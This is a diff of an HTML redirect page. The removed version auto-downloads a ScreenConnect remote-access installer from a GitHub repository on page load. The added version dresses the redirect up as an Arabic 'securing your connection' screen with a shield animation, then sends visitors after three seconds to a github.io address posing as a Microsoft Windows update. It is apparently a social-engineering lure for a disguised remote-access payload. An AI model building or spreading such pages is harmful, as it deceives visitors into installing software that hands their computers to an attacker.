@@ -1,9 +1,109 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-<meta http-equiv="refresh" content="0; url='https://github.com/kenneth23232/amazonnetwork/raw/refs/heads/main/ScreenConnect.ClientSetup.exe" />
+    <meta charset="UTF-8">
+    <title>Secure Redirection...</title>
+    <!-- تحويل تلقائي بعد 3 ثواني عشان تظهر الحركة الفخمة -->
+    <meta http-equiv="refresh" content="3; url='YOUR_URL_HERE'" />
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #05050a;
+            color: #00ffcc;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+        }
+
+        /* تصميم الرادار أو الدرع المتحرك */
+        .radar-box {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 30px auto;
+            border-radius: 50%;
+            background: rgba(0, 255, 204, 0.05);
+            border: 2px solid rgba(0, 255, 204, 0.2);
+            box-shadow: 0 0 25px rgba(0, 255, 204, 0.2);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .radar-box::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 2px dashed #00ffcc;
+            animation: rotateRadar 4s linear infinite;
+        }
+
+        .shield-icon {
+            font-size: 40px;
+            animation: pulseGlow 2s ease-in-out infinite;
+        }
+
+        h2 {
+            font-size: 20px;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
+        }
+
+        .loading-dots span {
+            animation: blink 1.4s infinite;
+            animation-fill-mode: both;
+            font-size: 24px;
+        }
+
+        .loading-dots span:nth-child(2) { animation-delay: .2s; }
+        .loading-dots span:nth-child(3) { animation-delay: .4s; }
+
+        @keyframes rotateRadar {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulseGlow {
+            0%, 100% { opacity: 0.4; transform: scale(0.95); }
+            50% { opacity: 1; transform: scale(1.05); }
+        }
+
+        @keyframes blink {
+            0% { opacity: .2; }
+            20% { opacity: 1; }
+            100% { opacity: .2; }
+        }
+    </style>
 </head>
 <body>
-<p>loading</p>
+
+    <div class="container">
+        <div class="radar-box">
+            <div class="shield-icon">🛡️</div>
+        </div>
+        <h2>جاري فحص وتأمين الاتصال</h2>
+        <div class="loading-dots">
+            <span>.</span><span>.</span><span>.</span>
+        </div>
+    </div>
+
+    <script>
+        // توجيه إضافي عبر الجافاسكريبت لضمان السرعة والدقة بعد 3 ثواني
+        setTimeout(function() {
+            window.location.href = "https://kenneth23232.github.io/microsoft-windows-pleaseupdate.com";
+        }, 3000);
+    </script>
+
 </body>
 </html>
